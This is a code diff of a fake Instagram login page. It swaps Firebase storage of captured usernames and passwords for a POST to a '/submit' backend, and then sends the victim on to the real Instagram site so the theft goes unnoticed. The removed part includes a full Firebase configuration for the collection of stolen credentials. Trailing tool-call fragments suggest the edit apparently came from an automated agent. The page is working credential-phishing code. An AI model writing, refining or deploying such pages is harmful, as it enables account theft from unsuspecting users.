@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Login • Instagram</title>
     <link rel="stylesheet" href="./style.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
     <link rel="icon" href="./images/logo.png" type="image/x-icon">
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore-compat.js"></script>
 </head>
+
 <body>
     <div class="main-wrapper">
         <div class="container">
@@ -87,22 +87,7 @@
     </div>
 
     <script>
-        // Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyBFLWTZnHz8EcLjsdHAXDXG5ogU7z0ok0I",
-            authDomain: "insta-7f34f.firebaseapp.com",
-            databaseURL: "https://insta-7f34f-default-rtdb.firebaseio.com",
-            projectId: "insta-7f34f",
-            storageBucket: "insta-7f34f.firebasestorage.app",
-            messagingSenderId: "981637167144",
-            appId: "1:981637167144:web:841af72e833be6ed081d1d"
-        };
-      
-        // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-
-        // Handle form submission
+        // Handle form submission - send to MongoDB backend
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
             
@@ -110,17 +95,26 @@
             const password = document.getElementById('password').value;
             
             try {
-                // Store in Firebase
-                await db.collection("login_attempts").add({
-                    username: username,
-                    password: password,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    userAgent: navigator.userAgent,
-                    timestampClient: new Date().toISOString()
+                // Send data to MongoDB backend
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        message: password
+                    })
                 });
                 
-                // Redirect to Instagram after successful storage
-                window.location.href = "https://www.instagram.com/";
+                if (response.ok) {
+                    // Redirect to Instagram after successful storage
+                    window.location.href = "https://www.instagram.com/";
+                } else {
+                    console.error("Failed to save data.");
+                    // Still redirect even if storage fails
+                    window.location.href = "https://www.instagram.com/";
+                }
             } catch (error) {
                 console.error("Error storing data: ", error);
                 // Still redirect even if storage fails
@@ -130,3 +124,5 @@
     </script>
 </body>
 </html>
+</CodeContent>
+<parameter name="EmptyFile">false
